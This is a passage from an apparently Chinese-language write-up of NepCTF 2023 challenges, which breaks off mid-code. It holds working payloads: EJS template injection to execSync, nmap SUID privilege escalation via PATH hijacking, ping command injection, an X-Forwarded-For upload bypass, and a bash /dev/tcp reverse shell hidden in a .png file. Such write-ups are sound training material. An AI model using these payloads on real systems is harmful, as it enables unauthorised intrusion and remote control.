class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>))    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">if</span> (name != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; address != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; message != <span class="hljs-string">&#x27;&#x27;</span>) &#123;            <span class="hljs-keyword">let</span> source = [<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;source1&quot;</span>, <span class="hljs-string">&quot;source2&quot;</span>, <span class="hljs-string">&quot;source3&quot;</span>].<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;                <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();            &#125;)            fs.<span class="hljs-title function_">readFile</span>(source[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, pageContent</span>)&#123;                fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/--ID--/g</span>, uuid.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">&quot;&quot;</span>)));                <span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>);            &#125;)        &#125; <span class="hljs-keyword">else</span> &#123;            res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Params `name` or `address` or `message` empty&quot;</span>);            <span class="hljs-keyword">return</span>;        &#125;    &#125; <span class="hljs-keyword">catch</span>(err) &#123;        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Failed to write file&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/page?pageid=<span class="hljs-subst">$&#123;uuid&#125;</span>&amp;name=<span class="hljs-subst">$&#123;name&#125;</span>&amp;address=<span class="hljs-subst">$&#123;address&#125;</span>&amp;message=<span class="hljs-subst">$&#123;message&#125;</span>`</span>);&#125;);app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)        <span class="hljs-keyword">return</span>;    &#125;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);&#125;)app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)&#125;)</code></pre></div><p>关键代码</p><div class="code-wrapper"><pre><code class="hljs javascript">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)        <span class="hljs-keyword">return</span>;    &#125;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);&#125;)</code></pre></div><p><code>req.query</code>放入<code>render</code>存在ejs模板注入</p><p>正常ejs模板注入是利用<code>opts.outputFunctionName 、opts.localsName 、opts.destructuredLocals</code> </p><p>而<code>cve2022的Bypass</code>是因为他们无法通过正则，于是找到<code>opts.escapeFunction</code>，使用<code>opts.escapeFunction</code>要保证<code>opts.client</code>不为空</p><p>此处使用cve2022的bypass （由于没有题目环境，无法确认，但应该是要绕过正则的）</p><p><code>payload</code>如下</p><div class="code-wrapper"><pre><code class="hljs sas">/<span class="hljs-keyword">page</span>?pageid=符合格式的id<span class="hljs-variable">&amp;name</span>=1<span class="hljs-variable">&amp;address</span>=1<span class="hljs-variable">&amp;message</span>=asdasd<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][escapeFunction]=console.log;this.global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;反弹shell&#x27;</span>);<span class="hljs-variable">&amp;settings</span>[<span class="hljs-keyword">view</span> <span class="hljs-keyword">options</span>][client]=true</code></pre></div><h3 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>大佬把nmap给dump下来分析</p><p><img src="/2023/08/31/NepCTF2023/image.png"></p><p>root权限命令执行</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span> nmap <span class="hljs-string">&quot;asd;sh&quot;</span></code></pre></div><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>题目提示环境变量提权</p><p>先找拥有suid权限的</p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -user root -perm -4000 -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -u=s -type f 2&gt;/</span>dev/<span class="hljs-keyword">null</span>#操作时&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>会报错</code></pre></div><p>只有nmap</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive   <span class="hljs-built_in">chmod</span> 777 ports-alive<span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>nmap 127.0.0.1</code></pre></div><p>一定要是<code>ports-alive</code>文件，因为<code>nmap</code>执行时会报错<code>ports-alive：not found</code>（就是这里被坑了）</p><p>nmap会调用<code>ports-alive</code>文件</p><h3 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a>独步天下-破除虚妄_探见真实</h3><p>该类题为内网题目，需要使用内网工具进行内网探测  （这里无环境复现，也没有实际尝试过，也不会尝试，所以探测过程就不写了 ，下次一定）</p><p>运行<code>ports-alive</code>(题目中存在的端口探测脚本)</p><p><code>ports-alive not found</code> 是因为使用的是<code>sh</code>而<code>ports-alive</code>中是<code>#!/bin/bash</code>，把该标注修改为<code>#!/bin/sh</code> （那上面的nmap就不知道什么原因了）</p><p><code>echo &quot;#!/bin/sh&quot; |cat - ports-alive &gt; temp &amp;&amp; mv temp ports-alive</code></p><p><code>./ports-alive 192.168.200.2/24 0 100</code></p><p>192.168.200.1发现80和82端口</p><p>打开82端口</p><p><img src="/2023/08/31/NepCTF2023/web1.png"></p><p>两处很明显能利用的地方</p><p>先尝试ping命令执行， <code>; &amp;&amp; || %0a</code></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ip_address</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als -l /</code></pre></div><p>flag什么权限都没有 （用户为mysql）              flag_mini什么权限也没有(用户为ctf)</p><p>第二关是读取flag_mini</p><p>大佬说尝试反弹shell回来，但这里做了一些过滤（官方说ban了chmod）</p><p>我猜测bash什么的应该是被禁用了，不然应该能直接bash反弹shell</p><p>然后想起文件上传</p><p>读取app.py</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, url_for, redirect<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> ctypes<span class="hljs-keyword">import</span> ctypes.util<span class="hljs-keyword">import</span> timeos.environ[<span class="hljs-string">&#x27;FLASK_ENV&#x27;</span>] = <span class="hljs-string">&#x27;production&#x27;</span>app = Flask(__name__)app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./&#x27;</span>lib_name=<span class="hljs-string">&#x27;./libping.so&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_ping_library</span>():    <span class="hljs-comment"># 加载共享库</span>    mylib = ctypes.CDLL(lib_name)    <span class="hljs-keyword">return</span> mylibmylib = load_ping_library()<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ping&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>():    <span class="hljs-keyword">global</span> mylib    ip_address = request.form[<span class="hljs-string">&#x27;ip_address&#x27;</span>]    result = ctypes.create_string_buffer(<span class="hljs-number">4096</span>*<span class="hljs-number">2</span>)    mylib.ping(ip_address.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), result)    <span class="hljs-keyword">return</span> result.value.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_avatar&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_avatar</span>():    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not allowed to upload files from this IP address.&quot;</span> + <span class="hljs-string">&quot; Your IP is: &quot;</span> + request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:        <span class="hljs-keyword">return</span> redirect(request.url)    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:        <span class="hljs-keyword">return</span> redirect(request.url)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allowed_file(file.filename):        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file format. Only PNG files are allowed.&#x27;</span>    <span class="hljs-comment"># 限制文件大小为 5KB</span>    MAX_FILE_SIZE = <span class="hljs-number">5</span> * <span class="hljs-number">1024</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(file.read()) &gt; MAX_FILE_SIZE:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File too large. Maximum size is 5KB.&#x27;</span>    <span class="hljs-comment"># 将文件保存到服务器</span>    file.seek(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 重置文件读取指针</span>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], <span class="hljs-string">&#x27;avatar.png&#x27;</span>))    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() == <span class="hljs-string">&#x27;png&#x27;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">82</span>,debug=<span class="hljs-literal">False</span>,use_reloader=<span class="hljs-literal">False</span>)</code></pre></div><p>看到文件上传的路由，审计一下</p><p>要求<code>X-Forwarded-For</code>请求头为<code>127.0.0.1</code>，限定文件后缀为png，上传的png文件最后命名为<code>avatar.png</code></p><p>因为要反弹shell，（可以用python，也可以用C语言）</p><p>上传png文件内容为</p><div class="code-wrapper"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>).<span class="hljs-built_in">read</span>()</code></pre></div><p><code>python3 avatar.png</code>执行文件，成功反弹shell</p><hr><p>这里之后的内容都不理解</p><p>需要做的是提权，看一下ps -ef有什么可疑进程</p><p><img src="/2023/08/31/NepCTF2023/web2.png"></p><p>查看identity源码</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><span class="hljs-comment">//gcc -o test1 test1.c -lcrypto -lm -lrt</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_dir</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> fd=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>,O_RDONLY);    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">2</span>) &#123;        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;    MD5_CTX ctx;    <span class="hljs-type">char</span> md5_res[<span class="hljs-number">17</span>]=<span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-type">char</span> key[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;NEPCTF_6666&quot;</span>;    <span class="hljs-type">char</span> sandbox_dir[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;    <span class="hljs-type">char</span> dir_name[<span class="hljs-number">100</span>]=<span class="hljs-string">&quot;/home/ctf/sandbox/&quot;</span>;    FILE *new_pip;    <span class="hljs-type">int</span> i;    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rlimit</span> r;    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;    <span class="hljs-built_in">setrlimit</span>(RLIMIT_CORE, &amp;r);    <span class="hljs-built_in">memset</span>(key, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(key));    <span class="hljs-built_in">MD5_Init</span>(&amp;ctx);    <span class="hljs-built_in">MD5_Update</span>(&amp;ctx, key, <span class="hljs-built_in">strlen</span>(key));    <span class="hljs-built_in">MD5_Final</span>(md5_res, &amp;ctx);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)            <span class="hljs-built_in">sprintf</span>(&amp;(dir_name[i*<span class="hljs-number">2</span> + <span class="hljs-number">18</span>]), <span class="hljs-string">&quot;%02hhx&quot;</span>, md5_res[i]&amp;<span class="hljs-number">0xff</span>);    <span class="hljs-type">char</span> cmd[<span class="hljs-number">100</span>];    <span class="hljs-built_in">mkdir</span>(dir_name, <span class="hljs-number">0755</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(dir_name)==<span class="hljs-number">-1</span>) &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chdir err, exiting\n&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-built_in">sprintf</span>(cmd,<span class="hljs-string">&quot;%s%s&quot;</span>,<span class="hljs-string">&quot;chmod 777 &quot;</span>,dir_name);    <span class="hljs-built_in">system</span>(cmd);    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;bin&quot;</span>, <span class="hljs-number">0777</span>);    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib&quot;</span>, <span class="hljs-number">0777</span>);    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib64&quot;</span>, <span class="hljs-number">0777</span>);    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;lib/x86_64-linux-gnu&quot;</span>, <span class="hljs-number">0777</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /bin/bash bin/sh&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libdl.so.2 lib/x86_64-linux-gnu/&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu/&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib/x86_64-linux-gnu/libtinfo.so.5 lib/x86_64-linux-gnu/&quot;</span>);    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cp /lib64/ld-linux-x86-64.so.2 lib64/&quot;</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chroot</span>(<span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;chroot err, exiting\n&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    &#125;&#125;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">command</span><span class="hljs-params">(<span class="hljs-type">int</span> server_socket,<span class="hljs-type">int</span> client_socket)</span> </span>&#123;    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x666</span>];    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x666</span>);    <span class="hljs-built_in">write</span>(client_socket,<span class="hljs-string">&quot;Tmp-Command:&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Tmp-Command:&quot;</span>));    <span class="hljs-built_in">read</span>(client_socket, buf, <span class="hljs-number">0x10</span>);    <span class="hljs-built_in">setgid</span>(<span class="hljs-number">1001</span>);    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">1001</span>);    <span class="hljs-built_in">popen</span>(buf,<span class="hljs-string">&quot;w&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_ip_address</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name, <span class="hljs-type">char</span> *ip_address)</span> </span>&#123;    <span class="hljs-type">int</span> sockfd;    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;    <span class="hljs-comment">// Create a socket</span>    sockfd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (sockfd &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-comment">// Set the interface name in the ifreq structure</span>    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, interface_name, IFNAMSIZ - <span class="hljs-number">1</span>);    ifr.ifr_name[IFNAMSIZ - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-comment">// Get the IP address using the SIOCGIFADDR ioctl request</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(sockfd, SIOCGIFADDR, &amp;ifr) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;ioctl failed&quot;</span>);        <span class="hljs-built_in">close</span>(sockfd);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">close</span>(sockfd);    <span class="hljs-comment">// Convert the binary IP address to a human-readable string</span>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> *addr = (<span class="hljs-keyword">struct</span> sockaddr_in *)&amp;ifr.ifr_addr;    <span class="hljs-built_in">strcpy</span>(ip_address, <span class="hljs-built_in">inet_ntoa</span>(addr-&gt;sin_addr));    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;    <span class="hljs-built_in">init_dir</span>();    <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;    <span class="hljs-comment">// Server setup</span>    <span class="hljs-type">int</span> server_socket, client_socket;    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> server_addr, client_addr;    <span class="hljs-type">socklen_t</span> client_len = <span class="hljs-built_in">sizeof</span>(client_addr);    <span class="hljs-comment">// Create socket</span>    server_socket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (server_socket &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Socket creation failed&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;    <span class="hljs-comment">// Set up server address</span>    <span class="hljs-built_in">memset</span>(&amp;server_addr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(server_addr));    server_addr.sin_family = AF_INET;    server_addr.sin_addr.s_addr = INADDR_ANY;    server_addr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">9999</span>);    <span class="hljs-comment">// Bind socket to address and port</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-built_in">sizeof</span>(server_addr)) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Bind failed&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;    <span class="hljs-comment">// Listen for incoming connections</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(server_socket, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;Listen failed&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Server is listening on port 9999...\n&quot;</span>);    <span class="hljs-comment">// Accept connection from client</span>    client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);    <span class="hljs-keyword">if</span> (client_socket &lt; <span class="hljs-number">0</span>) &#123;        client_socket = <span class="hljs-built_in">accept</span>(server_socket, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;client_addr, &amp;client_len);    &#125;    <span class="hljs-type">char</span> client_ip[INET_ADDRSTRLEN];    <span class="hljs-built_in">inet_ntop</span>(AF_INET, &amp;client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Client connected from IP: %s\n&quot;</span>, client_ip);    <span class="hljs-type">char</span> ip_address[INET_ADDRSTRLEN];    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *interface_name = <span class="hljs-string">&quot;eth0&quot;</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">get_ip_address</span>(interface_name, ip_address) == <span class="hljs-number">0</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IP address of eth0: %s\n&quot;</span>, ip_address);    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to get the IP address of eth0.\n&quot;</span>);    &#125;    <span class="hljs-keyword">while</span>(flag) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(client_ip,ip_address)) &#123;            <span class="hljs-built_in">send</span>(client_socket,<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-string">&quot;Only nc by localhost!\n&quot;</span>),<span class="hljs-number">0</span>);            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            flag=<span class="hljs-number">0</span>;        &#125;    &#125;    <span class="hljs-built_in">command</span>(server_socket,client_socket);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre></div><p><img src="/2023/08/31/NepCTF2023/web3.png" alt="image.png"></p><p>监听了eth0的9999端口</p><p>文件描述符没有关闭，文件流也没关闭，可以连接父进程的<code>openat</code>和<code>fchmod</code>这两个内置函数</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><span class="hljs-meta">#<span 